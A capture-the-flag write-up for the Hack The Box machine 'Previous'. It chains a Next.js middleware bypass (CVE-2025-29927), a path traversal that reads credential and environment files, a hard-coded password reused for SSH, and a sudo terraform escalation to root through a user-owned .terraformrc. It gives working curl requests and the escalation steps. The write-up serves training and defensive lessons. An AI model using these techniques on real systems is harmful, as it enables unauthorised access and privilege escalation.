# Previous — Hack The Box, Medium, Linux

**Chain:** Next.js middleware bypass → path traversal → hard-coded password →
password reuse → `sudo terraform` + `!env_reset` → root

Flags are redacted as `<32-hex-flag>`.

---

## The shape of the box, before any exploitation

A full 65535-port sweep returns two ports. That is worth pausing on, because it
changes how you should spend the next hour: with two ports, the path is definitely
in one of them, and the correct move is to *read the application* rather than to
reach for more scanners.

```
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.13   (Ubuntu 22.04)
80/tcp open  http  nginx 1.18.0 (Ubuntu)              → 302 previous.htb
```

Port 80 answers with `X-Powered-By: Next.js` and a landing page for a joke framework
called *PreviousJS* — "the technology of yesterday". Two things on that page matter:
a contact address, `jeremy@previous.htb`, which is a username; and a feature card
titled **"Opt-Out Middleware"**, sitting there with a straight face.

That is a hint, but a hint is not evidence. The evidence is the version.

### Pinning the version without a version endpoint

Next.js does not put its version in a header. It does put it in the client bundle:

```console
$ curl -s http://previous.htb/_next/static/chunks/main-0221d9991a31a63c.js \
    | grep -oE '"[0-9]+\.[0-9]+\.[0-9]+"' | sort -u
"15.2.2"
```

**15.2.2.** CVE-2025-29927 was fixed in 15.2.3.

While in the static build, the same directory hands over the whole route table for
free — no wordlist, no fuzzing, no 404 noise:

```console
$ curl -s http://previous.htb/_next/static/<buildId>/_buildManifest.js
... "/": ..., "/docs": ..., "/docs/[section]": ..., "/docs/content/examples": ...,
    "/docs/content/getting-started": ..., "/signin": ...
```

A directory brute force did run in the background out of habit. It found nothing the
build manifest had not already named. On any Next.js target, read the manifest first.

## Link 1 — the header that deletes the authentication layer

`/docs` and everything under it answer `307 → /api/auth/signin`. The application's
`middleware.ts` is three lines:

```ts
export { default } from "next-auth/middleware"
export const config = { matcher: ["/docs(.*)", "/api(.*)"] }
```

CVE-2025-29927 is an authorization bypass in how Next.js decides whether a request is
an internal subrequest. Internally the framework marks recursive middleware invocations
with an `x-middleware-subrequest` header and skips middleware when it sees enough
repetitions; before 15.2.3, it trusts that header when it arrives from the *outside*.

```console
$ curl -s -o /dev/null -w '%{http_code}\n' \
    -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
    http://previous.htb/docs
200
```

The matcher covers `/api(.*)` too, so the same header unlocks the API surface. That
detail turns out to be the whole reason the next link is reachable.

Behind the gate the docs are unremarkable — "Node.js 4 or later", "Basic understanding
of Java" — except for one link on the examples page:

```html
<a href="/api/download?example=hello-world.ts">Download the full example here</a>
```

A filename in a query parameter.

## Link 2 — traversal, and the depth sweep that mattered

```console
depth 1: 404 {"error":"File not found"}
depth 2: 404 {"error":"File not found"}
depth 3: 200 787  root:x:0:0:root:/root:/bin/sh …
```

Note depths 1 and 2. They return `File not found` — exactly what a working filter
looks like. Testing one depth and stopping would have marked this parameter dead. The
base directory is `${cwd}/public/examples`, three levels down, so nothing below three
was ever going to work. Sweeping the depth as a *range* is the only way a negative
result means anything.

Once inside, the source explains itself:

```ts
const filePath = `${process.cwd()}/public/examples/${example}`;
// ... fs.readFileSync(filePath) in a worker thread
...
const safeName = path.basename(String(example));   // ← sanitises the HEADER, not the path
```

There *is* a `path.basename` call. It is applied to the `Content-Disposition` filename,
after the file has already been read. It is the kind of detail that makes a reviewer
tick the box.

## Link 3 — read the deployment, not the repository

`/etc/passwd` says Alpine, and the process environment says why:

```
NODE_VERSION=18.20.8   PWD=/app   NODE_ENV=production   PORT=3000
```

with `nextjs:x:1001` as the runtime user. `/proc/self/mounts` shows a plain overlayfs
container: no host bind-mount, no docker socket, nothing to escape into. That is a
useful negative — it says the container is not the way out, so whatever the read gives
you has to be usable *from outside*.

`/app/.env` gives `NEXTAUTH_SECRET`, which is enough to forge a signed session. It was
never needed, but it is worth recording: it is a second, independent way past the login,
and it survives patching the CVE.

The thing that actually matters is one level deeper, in the compiled auth handler at
`/app/.next/server/pages/api/auth/[...nextauth].js`:

```ts
authorize: async (credentials) =>
  credentials?.username === "jeremy" &&
  credentials.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
```

A hard-coded fallback. And `ADMIN_SECRET` does not appear in `/proc/self/environ` —
so the fallback is not a fallback, it is *the* password.

## Link 4 — the container was never the point

```console
$ ssh jeremy@10.129.x.x
uid=1000(jeremy) gid=1000(jeremy)     # host "previous"
```

The container isolation was fine. It was made irrelevant by a password shared between
an application and an OS account. `user.txt` is in `jeremy`'s home:

```
user.txt — <32-hex-flag>
```

## Link 5 — a very carefully constrained sudo rule, and why it did not help

```
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=..., use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir=/opt/examples apply
```

Look at how much care went into that rule. Absolute binary path. Pinned working
directory. A single subcommand — not `terraform *`, which the methodology would flag
immediately as "the binary's whole flag surface". `secure_path` so `PATH` cannot be
hijacked. `use_pty`. And in `/opt/examples/main.tf`, a validation block that constrains
what the provider is allowed to touch:

```hcl
variable "source_path" {
  default = "/root/examples/hello-world.ts"
  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
  }
}
```

The rule is airtight against the attacks it anticipated. It is defeated by the one it
did not: **`!env_reset`**.

`env_delete+=PATH` shows the author was thinking about environment inheritance — and
stopped one variable short. `HOME` survives into the root process. Terraform reads its
CLI configuration from `$HOME/.terraformrc`. And `jeremy` already had one:

```hcl
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/usr/local/go/bin"
  }
  direct {}
}
```

`dev_overrides` tells Terraform to skip the registry and load a provider from a local
directory. The file is owned 0664 by `jeremy`. So the root process is being told where
to find an executable *by a file the unprivileged user owns*.

```hcl
"previous.htb/terraform/examples" = "/home/jeremy/.local/bin"
```

Drop anything executable named `terraform-provider-examples` there and run the sudo
command exactly as written:

```console
$ printf '<password>\nyes\n' | sudo -S /usr/bin/terraform -chdir=/opt/examples apply
│ Error: Failed to load plugin schemas
│ ... failed to negotiate the initial go-plugin protocol handshake
│   Path: /home/jeremy/.local/bin/terraform-provider-examples
│   Owner: 1000 [jeremy] (current: 0 [root])
```

Terraform fails. It does not matter — it fails *after* `fork`/`exec`. The stub had
already run:

```console
$ cat /tmp/.pwn_out
uid=0(root) gid=0(root) groups=0(root)
```

```
root.txt — <32-hex-flag>
```

The `source_path` validation is never evaluated. The provider's own logic is never
reached. Everything downstream of "load the plugin" was carefully secured, and the
attack lands upstream of it.

---

## What did not work, and what nearly went wrong

**A directory brute force was a waste of a scan slot.** The build manifest had the
routes. It ran anyway, in parallel, and cost nothing — but on a framework that
publishes its own route table, it is the wrong instinct.

**Two depths of traversal returned "File not found."** That is the near-miss of this
box. The response for a blocked traversal and the response for a correct traversal at
the wrong depth are byte-identical. A single-depth probe would have written the
parameter off, and the engagement would have gone looking for a second bug that does
not exist. The rule that saved it is mechanical: sweep depth 1–8 for every traversal
form, then conclude.

**The container looked like the interesting part.** It is a Docker container reached
through a file-read bug — the reflex is to hunt for a docker socket, a host mount, a
`CAP_SYS_ADMIN`. `/proc/self/mounts` answered that in one request: nothing. The read
was not a way into the host's filesystem; it was a way into the *application's source*,
and the source held a password. Reading beats escaping.

**The sudo target invited a rabbit hole.** `terraform apply` with a `main.tf` full of
validation logic and a custom provider is a large, inviting surface: what does the
provider do with `source_path`, can the validation be evaded, is there a symlink
primitive in the copy? None of it was needed. Enumerating the *whole* surface of a
root-run target first — including the config files it reads and the environment it
inherits — put `!env_reset` and a user-owned `.terraformrc` on the table within a
minute of reading `sudo -l`.

## The lesson worth keeping

Four of the five links are configuration, not code:

| link | class |
|---|---|
| Next.js 15.2.2 | an unpatched dependency |
| `/api/download` | string concatenation into a filesystem path |
| `?? "MyNameIs..."` | a credential in source, live because the env var is unset |
| SSH as `jeremy` | that credential reused as an OS password |
| `sudo terraform` | `!env_reset` + a config file the caller owns |

The CVE has the number, the score and the name — and it delivered an unauthenticated
*read as an unprivileged container user*. What made the box fall was a password written
into a source file and a sudoers `Defaults` line that keeps `HOME`. That asymmetry keeps
showing up: the vulnerability with the CVE is rarely the one that decides how bad the
outcome is.

The generalisable half of the last link is worth stating on its own, because it is not
about Terraform: **a sudo rule is only as constrained as the configuration its target
reads.** Any root-run tool that consults `$HOME` — `~/.terraformrc`, `~/.gitconfig`
(`core.pager`, `core.sshCommand`), `~/.ansible.cfg`, `~/.my.cnf`, `~/.psqlrc`,
`~/.curlrc`, `~/.npmrc` — turns `Defaults !env_reset` (or a stray `env_keep += "HOME"`)
into arbitrary root execution, no matter how precisely the command line is pinned. When
you see a sudo rule for a real tool, do not only read its flags: ask which files it
opens before it does anything, and who owns them.
